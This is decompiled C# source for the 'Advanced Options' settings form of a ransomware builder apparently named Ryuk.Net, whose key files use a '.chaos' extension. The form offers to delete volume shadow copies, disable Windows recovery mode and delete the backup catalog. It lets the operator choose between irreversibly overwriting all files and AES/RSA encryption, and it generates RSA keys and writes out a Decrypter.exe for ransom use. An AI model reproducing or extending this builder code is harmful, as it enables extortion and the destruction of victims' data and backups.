using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Xml.Serialization;
using CustomWindowsForm;
using Ryuk.Net.Properties;

namespace Ryuk.Net;

public class advancedSettingForm : Form
{
	private bool mouseDown;

	private Point lastLocation;

	private IContainer components = null;

	private Panel panel1;

	private ButtonZ buttonZ1;

	private CheckBox deleteBackupCatalogCheckbox;

	private CheckBox disableRecoveryModeCheckbox;

	private CheckBox deleteShadowCopiesCheckbox;

	private CheckBox resistAdminCheckbox;

	private Label label1;

	private RadioButton radioButton1;

	private RadioButton radioButton2;

	private Label overwriteInfoLabel;

	private OpenFileDialog openFileDialog1;

	private Label pathToXmlLabel;

	private Button button2;

	private TextBox textBox1;

	private Label label2;

	public advancedSettingForm()
	{
		InitializeComponent();
	}

	private void advancedSettingForm_Load(object sender, EventArgs e)
	{
		if (Settings.Default.checkAdminPrivilage)
		{
			resistAdminCheckbox.set_Checked(true);
		}
		else
		{
			resistAdminCheckbox.set_Checked(false);
		}
		if (Settings.Default.encryptOption)
		{
			radioButton2.set_Checked(true);
		}
		else
		{
			radioButton2.set_Checked(false);
		}
		string decrypterName = Settings.Default.decrypterName;
		if (decrypterName == "")
		{
			((Control)textBox1).set_Enabled(true);
			return;
		}
		((Control)textBox1).set_Text(decrypterName);
		((Control)textBox1).set_Enabled(false);
		((Control)button2).set_Text("Public key selected");
	}

	private void buttonZ1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void advancedSettingForm_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.get_Location();
	}

	private void advancedSettingForm_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).set_Location(new Point(((Form)this).get_Location().X - lastLocation.X + e.get_X(), ((Form)this).get_Location().Y - lastLocation.Y + e.get_Y()));
			((Control)this).Update();
		}
	}

	private void advancedSettingForm_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void buttonZ1_Click_1(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void resistAdminCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (resistAdminCheckbox.get_Checked())
		{
			Settings.Default.checkAdminPrivilage = true;
			((Control)deleteShadowCopiesCheckbox).set_Enabled(true);
			((Control)disableRecoveryModeCheckbox).set_Enabled(true);
			((Control)deleteBackupCatalogCheckbox).set_Enabled(true);
			deleteShadowCopiesCheckbox.set_Checked(true);
			disableRecoveryModeCheckbox.set_Checked(true);
			deleteBackupCatalogCheckbox.set_Checked(true);
		}
		else
		{
			Settings.Default.checkAdminPrivilage = false;
			((Control)deleteShadowCopiesCheckbox).set_Enabled(false);
			((Control)disableRecoveryModeCheckbox).set_Enabled(false);
			((Control)deleteBackupCatalogCheckbox).set_Enabled(false);
			deleteShadowCopiesCheckbox.set_Checked(false);
			disableRecoveryModeCheckbox.set_Checked(false);
			deleteBackupCatalogCheckbox.set_Checked(false);
		}
	}

	private void panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void panel1_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).set_Location(new Point(((Form)this).get_Location().X - lastLocation.X + e.get_X(), ((Form)this).get_Location().Y - lastLocation.Y + e.get_Y()));
			((Control)this).Update();
		}
	}

	private void panel1_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void panel1_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.get_Location();
	}

	private void deleteShadowCopiesCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (deleteShadowCopiesCheckbox.get_Checked())
		{
			Settings.Default.deleteShadowCopies = true;
		}
		else
		{
			Settings.Default.deleteShadowCopies = false;
		}
	}

	private void deleteBackupCatalogCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (deleteBackupCatalogCheckbox.get_Checked())
		{
			Settings.Default.deleteBackupCatalog = true;
		}
		else
		{
			Settings.Default.deleteBackupCatalog = false;
		}
	}

	private void disableRecoveryModeCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (disableRecoveryModeCheckbox.get_Checked())
		{
			Settings.Default.disableRecoveryMode = true;
		}
		else
		{
			Settings.Default.disableRecoveryMode = false;
		}
	}

	private void radioButton1_CheckedChanged(object sender, EventArgs e)
	{
		((Control)button2).set_Visible(false);
		((Control)textBox1).set_Visible(false);
		((Control)label2).set_Visible(false);
		((Control)overwriteInfoLabel).set_Text("This function works faster but files cannot be returned ");
		Settings.Default.encryptOption = false;
	}

	private void radioButton2_CheckedChanged(object sender, EventArgs e)
	{
		((Control)button2).set_Visible(true);
		((Control)textBox1).set_Visible(true);
		((Control)label2).set_Visible(true);
		((Control)overwriteInfoLabel).set_Text("Files will be encrypted with AES / RSA method ");
		Settings.Default.encryptOption = true;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_FilterIndex(1);
		if ((int)((CommonDialog)val).ShowDialog() == 1)
		{
			string fileName = ((FileDialog)val).get_FileName();
			string fileName2 = Path.GetFileName(fileName);
			((Control)textBox1).set_Text(fileName2);
			MessageBox.Show(fileName);
		}
	}

	private void decrypter(string decrypter)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_024b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0306: Unknown result type (might be due to invalid IL or missing references)
		//IL_033d: Unknown result type (might be due to invalid IL or missing references)
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		RSAParameters publicKey = rSACryptoServiceProvider.ExportParameters(includePrivateParameters: true);
		RSAParameters publicKey2 = rSACryptoServiceProvider.ExportParameters(includePrivateParameters: false);
		string keyString = GetKeyString(publicKey2);
		string keyString2 = GetKeyString(publicKey);
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string text;
		if (((Control)textBox1).get_Text().Contains("-decrypter"))
		{
			text = ((Control)textBox1).get_Text();
			if (text == "")
			{
				MessageBox.Show("Decrypter name field is empty!");
				return;
			}
			if (Directory.Exists(text))
			{
				string path = directoryName + "\\" + text + "\\publicKey.chaos";
				Settings.Default.publicKey = File.ReadAllText(path);
				Settings.Default.decrypterName = text;
				MessageBox.Show("Public key selected successfully!");
				((Control)textBox1).set_Text(text);
				((Control)textBox1).set_Enabled(false);
				((Control)button2).set_Text("Public key selected");
				return;
			}
			try
			{
				Directory.CreateDirectory(text);
				string path2 = directoryName + "\\" + text + "\\publicKey.chaos";
				string path3 = directoryName + "\\" + text + "\\privateKey.chaos";
				File.WriteAllText(path2, keyString);
				File.WriteAllText(path3, keyString2);
				byte[] bytes = Resources.decrypter;
				File.WriteAllBytes(directoryName + "\\" + text + "\\Decrypter.exe", bytes);
				Settings.Default.publicKey = File.ReadAllText(path2);
				Settings.Default.decrypterName = text;
				MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
				((Control)textBox1).set_Text(text);
				((Control)textBox1).set_Enabled(false);
				((Control)button2).set_Text("Public key selected");
				return;
			}
			catch
			{
				MessageBox.Show("Unexpected error occured");
				return;
			}
		}
		text = ((Control)textBox1).get_Text() + "-decrypter";
		if (text == "-decrypter")
		{
			MessageBox.Show("Decrypter name field is empty!");
			return;
		}
		if (Directory.Exists(text) || Directory.Exists(text + "-decrypter"))
		{
			string path4 = directoryName + "\\" + text + "\\publicKey.chaos";
			Settings.Default.publicKey = File.ReadAllText(path4);
			Settings.Default.decrypterName = text;
			MessageBox.Show("Decrypter exists. Public key selected successfully!");
			((Control)textBox1).set_Text(text);
			((Control)textBox1).set_Enabled(false);
			((Control)button2).set_Text("Public key selected");
			return;
		}
		try
		{
			Directory.CreateDirectory(text);
			string path5 = directoryName + "\\" + text + "\\publicKey.chaos";
			string path6 = directoryName + "\\" + text + "\\privateKey.chaos";
			File.WriteAllText(path5, keyString);
			File.WriteAllText(path6, keyString2);
			byte[] bytes2 = Resources.decrypter;
			File.WriteAllBytes(directoryName + "\\" + text + "\\Decrypter.exe", bytes2);
			Settings.Default.publicKey = File.ReadAllText(path5);
			Settings.Default.decrypterName = text;
			MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
			((Control)textBox1).set_Text(text);
			((Control)textBox1).set_Enabled(false);
			((Control)button2).set_Text("Public key selected");
		}
		catch
		{
			MessageBox.Show("Unexpected error occured");
		}
	}

	public static string GetKeyString(RSAParameters publicKey)
	{
		StringWriter stringWriter = new StringWriter();
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(RSAParameters));
		xmlSerializer.Serialize(stringWriter, publicKey);
		return stringWriter.ToString();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_0240: Unknown result type (might be due to invalid IL or missing references)
		//IL_024a: Expected O, but got Unknown
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_0261: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Expected O, but got Unknown
		//IL_0285: Unknown result type (might be due to invalid IL or missing references)
		//IL_028f: Expected O, but got Unknown
		//IL_02ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b8: Expected O, but got Unknown
		//IL_03e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ec: Expected O, but got Unknown
		//IL_04a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b2: Expected O, but got Unknown
		//IL_0528: Unknown result type (might be due to invalid IL or missing references)
		//IL_0532: Expected O, but got Unknown
		//IL_05bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c6: Expected O, but got Unknown
		//IL_0682: Unknown result type (might be due to invalid IL or missing references)
		//IL_068c: Expected O, but got Unknown
		//IL_0742: Unknown result type (might be due to invalid IL or missing references)
		//IL_074c: Expected O, but got Unknown
		//IL_0806: Unknown result type (might be due to invalid IL or missing references)
		//IL_0810: Expected O, but got Unknown
		//IL_0b2f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b39: Expected O, but got Unknown
		//IL_0c6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c76: Expected O, but got Unknown
		//IL_0c7e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c88: Expected O, but got Unknown
		//IL_0c90: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c9a: Expected O, but got Unknown
		panel1 = new Panel();
		label2 = new Label();
		textBox1 = new TextBox();
		button2 = new Button();
		pathToXmlLabel = new Label();
		overwriteInfoLabel = new Label();
		radioButton2 = new RadioButton();
		radioButton1 = new RadioButton();
		label1 = new Label();
		buttonZ1 = new ButtonZ();
		deleteBackupCatalogCheckbox = new CheckBox();
		disableRecoveryModeCheckbox = new CheckBox();
		deleteShadowCopiesCheckbox = new CheckBox();
		resistAdminCheckbox = new CheckBox();
		openFileDialog1 = new OpenFileDialog();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).get_Controls().Add((Control)(object)textBox1);
		((Control)panel1).get_Controls().Add((Control)(object)button2);
		((Control)panel1).get_Controls().Add((Control)(object)pathToXmlLabel);
		((Control)panel1).get_Controls().Add((Control)(object)overwriteInfoLabel);
		((Control)panel1).get_Controls().Add((Control)(object)radioButton2);
		((Control)panel1).get_Controls().Add((Control)(object)radioButton1);
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).get_Controls().Add((Control)(object)buttonZ1);
		((Control)panel1).get_Controls().Add((Control)(object)deleteBackupCatalogCheckbox);
		((Control)panel1).get_Controls().Add((Control)(object)disableRecoveryModeCheckbox);
		((Control)panel1).get_Controls().Add((Control)(object)deleteShadowCopiesCheckbox);
		((Control)panel1).get_Controls().Add((Control)(object)resistAdminCheckbox);
		((Control)panel1).set_Location(new Point(2, 1));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(346, 364));
		((Control)panel1).set_TabIndex(11);
		((Control)panel1).add_Paint(new PaintEventHandler(panel1_Paint));
		((Control)panel1).add_MouseDown(new MouseEventHandler(panel1_MouseDown));
		((Control)panel1).add_MouseMove(new MouseEventHandler(panel1_MouseMove));
		((Control)panel1).add_MouseUp(new MouseEventHandler(panel1_MouseUp));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(13, 310));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(107, 16));
		((Control)label2).set_TabIndex(30);
		((Control)label2).set_Text("Decrypter Name");
		((Control)label2).set_Visible(false);
		((Control)textBox1).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(16, 329));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(159, 20));
		((Control)textBox1).set_TabIndex(29);
		((Control)textBox1).set_Visible(false);
		((Control)button2).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)button2).set_Cursor(Cursors.get_Hand());
		((Control)button2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_ForeColor(Color.White);
		((Control)button2).set_Location(new Point(201, 323));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(136, 26));
		((Control)button2).set_TabIndex(28);
		((Control)button2).set_Text("Create Decrypter");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).set_Visible(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)pathToXmlLabel).set_AutoSize(true);
		((Control)pathToXmlLabel).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)pathToXmlLabel).set_ForeColor(Color.White);
		((Control)pathToXmlLabel).set_Location(new Point(22, 361));
		((Control)pathToXmlLabel).set_Name("pathToXmlLabel");
		((Control)pathToXmlLabel).set_Size(new Size(0, 16));
		((Control)pathToXmlLabel).set_TabIndex(26);
		((Control)overwriteInfoLabel).set_AutoSize(true);
		((Control)overwriteInfoLabel).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)overwriteInfoLabel).set_ForeColor(Color.White);
		((Control)overwriteInfoLabel).set_Location(new Point(17, 284));
		((Control)overwriteInfoLabel).set_Name("overwriteInfoLabel");
		((Control)overwriteInfoLabel).set_Size(new Size(321, 16));
		((Control)overwriteInfoLabel).set_TabIndex(24);
		((Control)overwriteInfoLabel).set_Text("This function works faster but files cannot be returned ");
		((Control)radioButton2).set_AutoSize(true);
		((Control)radioButton2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radioButton2).set_ForeColor(Color.White);
		((Control)radioButton2).set_Location(new Point(201, 249));
		((Control)radioButton2).set_Name("radioButton2");
		((Control)radioButton2).set_Size(new Size(142, 20));
		((Control)radioButton2).set_TabIndex(23);
		((Control)radioButton2).set_Text("Encrypt  AES / RSA");
		((ButtonBase)radioButton2).set_UseVisualStyleBackColor(true);
		radioButton2.add_CheckedChanged((EventHandler)radioButton2_CheckedChanged);
		((Control)radioButton1).set_AutoSize(true);
		radioButton1.set_Checked(true);
		((Control)radioButton1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radioButton1).set_ForeColor(Color.White);
		((Control)radioButton1).set_Location(new Point(25, 249));
		((Control)radioButton1).set_Name("radioButton1");
		((Control)radioButton1).set_Size(new Size(126, 20));
		((Control)radioButton1).set_TabIndex(22);
		radioButton1.set_TabStop(true);
		((Control)radioButton1).set_Text("Overwrite all files");
		((ButtonBase)radioButton1).set_UseVisualStyleBackColor(true);
		radioButton1.add_CheckedChanged((EventHandler)radioButton1_CheckedChanged);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(10, 27));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(252, 31));
		((Control)label1).set_TabIndex(21);
		((Control)label1).set_Text("Advanced Options");
		((Control)buttonZ1).set_Anchor((AnchorStyles)9);
		buttonZ1.BZBackColor = Color.FromArgb(30, 30, 30);
		buttonZ1.DisplayText = "X";
		((ButtonBase)buttonZ1).set_FlatStyle((FlatStyle)0);
		((Control)buttonZ1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)buttonZ1).set_ForeColor(Color.White);
		((Control)buttonZ1).set_Location(new Point(315, 0));
		buttonZ1.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		buttonZ1.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)buttonZ1).set_Name("buttonZ1");
		((Control)buttonZ1).set_Size(new Size(31, 24));
		((Control)buttonZ1).set_TabIndex(20);
		((Control)buttonZ1).set_Text("X");
		buttonZ1.TextLocation_X = 6;
		buttonZ1.TextLocation_Y = 1;
		((ButtonBase)buttonZ1).set_UseVisualStyleBackColor(true);
		((Control)buttonZ1).add_Click((EventHandler)buttonZ1_Click_1);
		((Control)deleteBackupCatalogCheckbox).set_AutoSize(true);
		((Control)deleteBackupCatalogCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)deleteBackupCatalogCheckbox).set_Enabled(false);
		((Control)deleteBackupCatalogCheckbox).set_ForeColor(Color.White);
		((Control)deleteBackupCatalogCheckbox).set_Location(new Point(79, 151));
		((Control)deleteBackupCatalogCheckbox).set_Name("deleteBackupCatalogCheckbox");
		((Control)deleteBackupCatalogCheckbox).set_Size(new Size(152, 17));
		((Control)deleteBackupCatalogCheckbox).set_TabIndex(19);
		((Control)deleteBackupCatalogCheckbox).set_Text("Delete the backup catalog");
		((ButtonBase)deleteBackupCatalogCheckbox).set_UseVisualStyleBackColor(true);
		deleteBackupCatalogCheckbox.add_CheckedChanged((EventHandler)deleteBackupCatalogCheckbox_CheckedChanged);
		((Control)disableRecoveryModeCheckbox).set_AutoSize(true);
		((Control)disableRecoveryModeCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)disableRecoveryModeCheckbox).set_Enabled(false);
		((Control)disableRecoveryModeCheckbox).set_ForeColor(Color.White);
		((Control)disableRecoveryModeCheckbox).set_Location(new Point(79, 186));
		((Control)disableRecoveryModeCheckbox).set_Name("disableRecoveryModeCheckbox");
		((Control)disableRecoveryModeCheckbox).set_Size(new Size(178, 17));
		((Control)disableRecoveryModeCheckbox).set_TabIndex(18);
		((Control)disableRecoveryModeCheckbox).set_Text("Disable windows recovery mode");
		((ButtonBase)disableRecoveryModeCheckbox).set_UseVisualStyleBackColor(true);
		disableRecoveryModeCheckbox.add_CheckedChanged((EventHandler)disableRecoveryModeCheckbox_CheckedChanged);
		((Control)deleteShadowCopiesCheckbox).set_AutoSize(true);
		((Control)deleteShadowCopiesCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)deleteShadowCopiesCheckbox).set_Enabled(false);
		((Control)deleteShadowCopiesCheckbox).set_ForeColor(Color.White);
		((Control)deleteShadowCopiesCheckbox).set_Location(new Point(79, 115));
		((Control)deleteShadowCopiesCheckbox).set_Name("deleteShadowCopiesCheckbox");
		((Control)deleteShadowCopiesCheckbox).set_Size(new Size(190, 17));
		((Control)deleteShadowCopiesCheckbox).set_TabIndex(17);
		((Control)deleteShadowCopiesCheckbox).set_Text("Delete all Volumes Shadow Copies");
		((ButtonBase)deleteShadowCopiesCheckbox).set_UseVisualStyleBackColor(true);
		deleteShadowCopiesCheckbox.add_CheckedChanged((EventHandler)deleteShadowCopiesCheckbox_CheckedChanged);
		((Control)resistAdminCheckbox).set_AutoSize(true);
		((Control)resistAdminCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)resistAdminCheckbox).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)resistAdminCheckbox).set_ForeColor(Color.White);
		((Control)resistAdminCheckbox).set_Location(new Point(63, 78));
		((Control)resistAdminCheckbox).set_Name("resistAdminCheckbox");
		((Control)resistAdminCheckbox).set_Size(new Size(212, 20));
		((Control)resistAdminCheckbox).set_TabIndex(16);
		((Control)resistAdminCheckbox).set_Text("Resist for admin privileges");
		((ButtonBase)resistAdminCheckbox).set_UseVisualStyleBackColor(true);
		resistAdminCheckbox.add_CheckedChanged((EventHandler)resistAdminCheckbox_CheckedChanged);
		((FileDialog)openFileDialog1).set_FileName("openFileDialog1");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(25, 25, 25));
		((Form)this).set_ClientSize(new Size(352, 372));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("advancedSettingForm");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("advancedSettingForm");
		((Form)this).add_Load((EventHandler)advancedSettingForm_Load);
		((Control)this).add_MouseDown(new MouseEventHandler(advancedSettingForm_MouseDown));
		((Control)this).add_MouseMove(new MouseEventHandler(advancedSettingForm_MouseMove));
		((Control)this).add_MouseUp(new MouseEventHandler(advancedSettingForm_MouseUp));
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
